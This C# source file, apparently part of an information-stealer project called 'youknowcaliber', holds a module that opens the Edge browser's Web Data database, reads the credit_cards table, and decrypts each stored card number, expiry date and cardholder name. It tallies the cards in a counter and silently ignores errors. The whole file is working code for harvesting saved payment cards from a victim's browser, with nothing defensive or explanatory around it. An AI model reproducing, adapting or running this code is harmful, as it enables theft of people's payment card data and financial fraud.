using System.Collections.Generic;

namespace youknowcaliber.Edge
{
    internal sealed class CreditCards
    {
        /// <summary>
        /// Get CreditCards from edge  browser
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with credit cards</returns>
        public static List<CreditCard> Get(string sWebData)
        {
            List<CreditCard> lcCC = new List<CreditCard>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "credit_cards");
                if (sSQLite == null) return lcCC;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    CreditCard cCard = new CreditCard();

                    cCard.sNumber = Chromium.Crypto.GetUTF8(Chromium.Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 4)));
                    cCard.sExpYear = Chromium.Crypto.GetUTF8(Chromium.Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 3)));
                    cCard.sExpMonth = Chromium.Crypto.GetUTF8(Chromium.Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 2)));
                    cCard.sName = Chromium.Crypto.GetUTF8(Chromium.Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 1)));

                    Counting.CreditCards++;
                    lcCC.Add(cCard);
                }
            }
            catch { }
            return lcCC;
        }
    }
}
